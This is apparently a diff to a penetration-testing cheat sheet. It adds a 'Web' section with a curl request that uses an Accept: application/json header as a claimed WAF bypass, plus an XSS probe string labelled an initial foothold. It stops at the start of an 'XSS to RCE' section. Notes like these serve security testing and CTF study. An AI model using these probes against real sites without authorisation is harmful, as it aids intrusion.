@@ -360,6 +360,16 @@ $ ./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>
 ```
 
 ## Web
+### Authorization
+- Bypass waf json: 
+
+    ```bash
+    $ curl blabla/1 -H 'Accept: application/json'
+    ```
+
+### XSS
+- Initial foothold using: `1234'"><`.
+
 ### XSS to RCE
 ```bash
 # Attacker:
